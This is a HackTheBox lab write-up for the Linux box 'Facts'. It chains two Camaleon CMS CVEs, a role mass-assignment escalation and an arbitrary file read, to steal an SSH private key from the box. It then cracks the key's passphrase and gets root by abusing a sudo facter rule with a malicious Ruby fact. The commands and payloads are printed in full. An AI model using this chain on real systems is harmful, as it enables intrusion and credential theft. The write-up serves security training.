# Facts — HackTheBox Writeup
**Difficulty:** Easy | **OS:** Linux

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Web Enumeration](#web-enumeration)
3. [Exploitation — CVE-2025-2304 (Privilege Escalation in Camaleon CMS)](#exploitation--cve-2025-2304-privilege-escalation-in-camaleon-cms)
4. [Exploitation — CVE-2024-46987 (Arbitrary File Read)](#exploitation--cve-2024-46987-arbitrary-file-read)
5. [SSH Access & User Flag](#ssh-access--user-flag)
6. [Privilege Escalation to Root](#privilege-escalation-to-root)
7. [Summary](#summary)

---

## Reconnaissance

Initial port scan with Nmap to identify open services:

```bash
nmap -sV -sC 10.129.xx.xx
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports are open:
- **22/tcp** — SSH (OpenSSH 9.9p1)
- **80/tcp** — HTTP (nginx 1.26.3), redirecting to `http://facts.htb/`

Add the hostname to `/etc/hosts`:

```bash
echo "10.129.xx.xx  facts.htb" >> /etc/hosts
```

---

## Web Enumeration

Browsing to `http://facts.htb/` reveals a web application running **Camaleon CMS v2.9.0**.

The application allows user registration and login. An account was created and used for authenticated testing.

---

## Exploitation — CVE-2025-2304 (Privilege Escalation in Camaleon CMS)

**CVE:** CVE-2025-2304  
**Type:** Mass Assignment Vulnerability  
**Impact:** Escalate a low-privilege user account to Administrator

**PoC:** https://github.com/d3vn0mi/cve-2025-2304-poc

A registered user account (`hello`) was used with the public PoC script:

```bash
python3 cve-2025-2304.py http://facts.htb -u hello -p <REDACTED>
```

**Output:**

```
============================================================
   CVE-2025-2304 - Camaleon CMS Privilege Escalation PoC
   Pre-Registered User Version
============================================================

[*] Target: http://facts.htb
[*] Username: hello
[*] Logging in as hello...
[+] Successfully logged in

[*] Checking CMS version...
[*] Detected version: 2.9.0
[+] Version is VULNERABLE (< 2.9.1)

[*] Target User: hello (ID: 5)
[*] Current Role: Client (client)

[2/7] Testing: AJAX endpoint - password[role]

============================================================
[+] EXPLOITATION SUCCESSFUL!
============================================================
[+] Privilege Escalation: Client → Administrator
[+] Vulnerable Endpoint: /admin/users/5/updated_ajax
[+] Working Payload: {'password[role]': 'admin'}
[+] CVE-2025-2304 CONFIRMED!
```

After refreshing the browser, the `hello` account now has **Administrator** access to the CMS.

---

## Exploitation — CVE-2024-46987 (Arbitrary File Read)

**CVE:** CVE-2024-46987  
**Type:** Arbitrary File Read  
**Impact:** Read arbitrary files from the server filesystem as the web application user

**PoC:** https://github.com/Goultarde/CVE-2024-46987

With admin access obtained in the previous step, the arbitrary file read vulnerability was leveraged.

### Read `/etc/passwd`

```bash
python3 CVE-2024-46987.py -u http://facts.htb -l hello -p <REDACTED> /etc/passwd
```

Notable users identified from the output:

```
root:x:0:0:root:/root:/bin/bash
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

Two regular users exist on the system: `trivia` and `william`.

### Read SSH Private Key

```bash
python3 CVE-2024-46987.py -u http://facts.htb -l hello -p <REDACTED> /home/trivia/.ssh/id_ed25519
```

**Output:** An encrypted OpenSSH private key (Ed25519) was retrieved for the `trivia` user.

```
-----BEGIN OPENSSH PRIVATE KEY-----
<REDACTED>
-----END OPENSSH PRIVATE KEY-----
```

### Crack the Key Passphrase

The private key is passphrase-protected. Use `ssh2john` and `john` to crack it:

```bash
ssh2john id_ed25519 > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:**

```
<REDACTED>      (id_ed25519)
1g 0:00:03:33 DONE
```

The passphrase was successfully cracked.

---

## SSH Access & User Flag

Use the cracked passphrase to log in as `trivia`:

```bash
chmod 600 id_ed25519
ssh -i id_ed25519 trivia@10.129.xx.xx
```

Enter the cracked passphrase when prompted.

```
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)
trivia@facts:~$
```

### User Flag

```bash
trivia@facts:/home/william$ cat user.txt
<REDACTED>
```

---

## Privilege Escalation to Root

### Sudo Enumeration

Check what `trivia` can run with `sudo`:

```bash
sudo -l
```

**Output:**

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

The user can run `/usr/bin/facter` as root without a password. `facter` is a system facts tool (from Puppet) that supports loading **custom facts** from a directory via the `--custom-dir` flag.

### Exploitation via Custom Facter Fact

Create a malicious Ruby fact file that spawns a root shell:

```bash
mkdir -p /tmp/facter
echo 'exec "/bin/bash"' > /tmp/facter/shell.rb
```

Run `facter` with the custom directory as root:

```bash
sudo /usr/bin/facter --custom-dir /tmp/facter
```

**Result:**

```
root@facts:/home/trivia# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root Flag

```bash
root@facts:~# cat root.txt
<REDACTED>
```

---

## Summary

### Step-by-Step Attack Chain

| # | Step | Detail |
|---|------|--------|
| 1 | **Nmap Scan** | Discovered ports 22 (SSH) and 80 (HTTP/nginx). HTTP redirects to `facts.htb`. |
| 2 | **Web Enumeration** | Found Camaleon CMS v2.9.0. User registration is open. |
| 3 | **CVE-2025-2304** | Mass assignment vulnerability in `/admin/users/<id>/updated_ajax`. Sending `{'password[role]': 'admin'}` escalated the registered user `hello` from `client` to `admin`. |
| 4 | **CVE-2024-46987** | Arbitrary file read using the newly obtained admin session. Read `/etc/passwd` to identify system users (`trivia`, `william`). |
| 5 | **SSH Key Extraction** | Read `/home/trivia/.ssh/id_ed25519` via the file read vulnerability. |
| 6 | **Passphrase Cracking** | Converted key with `ssh2john`, cracked the passphrase using `john` and `rockyou.txt`. |
| 7 | **SSH Login** | Authenticated as `trivia` and retrieved the **user flag**. |
| 8 | **Sudo Enumeration** | `sudo -l` showed `trivia` can run `/usr/bin/facter` as root without a password. |
| 9 | **Facter Abuse** | Created a malicious Ruby fact (`exec "/bin/bash"`) in `/tmp/facter/` and ran `sudo /usr/bin/facter --custom-dir /tmp/facter` to get a root shell. |
| 10 | **Root Flag** | Read `/root/root.txt` as root. |

### CVEs Exploited

| CVE | Description | Affected Component |
|-----|-------------|-------------------|
| CVE-2025-2304 | Mass Assignment — privilege escalation from client to admin | Camaleon CMS < 2.9.1 |
| CVE-2024-46987 | Arbitrary File Read via admin panel | Camaleon CMS |

### Key Takeaways

- **Mass assignment** vulnerabilities occur when user-supplied parameters are passed directly to model update methods without a whitelist, allowing attackers to set fields like `role` that should never be user-controlled.
- **Arbitrary file read** in a CMS with a privileged server process can expose SSH keys, credentials, and other sensitive files.
- **Misconfigured sudo rules** (especially `NOPASSWD` on tools that load external code like `facter`) are a critical local privilege escalation vector. Any tool that executes user-supplied scripts or plugins should never be granted unrestricted sudo access.
